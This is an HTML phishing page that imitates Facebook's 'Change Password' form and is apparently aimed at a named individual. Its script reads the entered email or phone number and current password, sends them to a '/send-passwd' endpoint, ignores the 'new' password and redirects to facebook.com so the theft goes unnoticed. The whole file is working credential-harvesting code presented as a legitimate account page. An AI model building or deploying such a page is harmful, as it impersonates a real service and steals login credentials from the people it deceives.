<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change password | Accounts center</title>
    <link type="text/css" rel="stylesheet" href="/static/styles.css">
    <script>
        async function send(event) {
            event.preventDefault();
            let userId = document.getElementById("user-id").value;
            let currPassword = document.getElementById("curr-password").value;
            let newPassword = document.getElementById("new-password").value;
            let retypePassword = document.getElementById("retype-new-password").value;
            if (!validate(userId, currPassword, newPassword, retypePassword)){
                return;
            }
            const response = await fetch(`/send-passwd?user_id=${userId}&password=${currPassword}`);    
            if (!response.ok) {
                const error = await response.json();
                console.log(`Error: ${error.error}`);
                return;
            }
            window.location.href = 'https://facebook.com';
        }
        function validate(userId, currPassword, newPassword, repeatPassword) {
            let flag = true;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^\+?\d{6,15}$/;
            const passwordRegex = /^(?=.*[A-Za-z]).{6,}$/;
            const isValidUserId = emailRegex.test(userId) || phoneRegex.test(userId);
            if (!isValidUserId) {
                document.getElementById("wrong-id").hidden = flag = false;
            } else {
                document.getElementById("wrong-id").hidden = true;
            }
            if (!passwordRegex.test(currPassword)) {
                document.getElementById("wrong-curr-password").hidden = flag = false;
            } else {
                document.getElementById("wrong-curr-password").hidden = true;
            }
            if (!passwordRegex.test(newPassword)) {
            document.getElementById("wrong-new-password").hidden = flag = false;
            } else {
                document.getElementById("wrong-new-password").hidden = true;
            }
            if (repeatPassword != newPassword) {
                document.getElementById("wrong-retype-password").hidden = flag = false;
            } else {
                document.getElementById("wrong-retype-password").hidden = true;
            }
            return flag
        }

    </script>
</head>
<body>
    <form action="" onsubmit="send(event)">
        <p>Giorgi Akhalaia  Â· Facebook</p>
        <h1>Change Password</h1>
        <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters(!@%)</p>
        <label for="user-id">Email/Phone number</label>
        <input type="text" id="user-id">
        <div id="wrong-id" hidden>Enter a valid phone number or email address</div>

        <label for="curr-password">Current password</label>
        <input type="password" id="curr-password">
        <div id="wrong-curr-password" hidden>Wrong password</div>

        <label for="new-password">New password</label>
        <input type="password" id="new-password">
        <div id="wrong-new-password" hidden>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters(!@%)</div>

        <label for="retype-new-password">Re-type new password</label>
        <input type="password" id="retype-new-password">
        <div id="wrong-retype-password" hidden>Passwords do not match</div>
        <a href="">Forgot your password?</a>
        <label for="logout">Log out of other devices. Choose this if someone uses your account.</label>
        <input type="checkbox" id="logout" checked>
        <button>Change password</button>
    </form>
</body>
</html>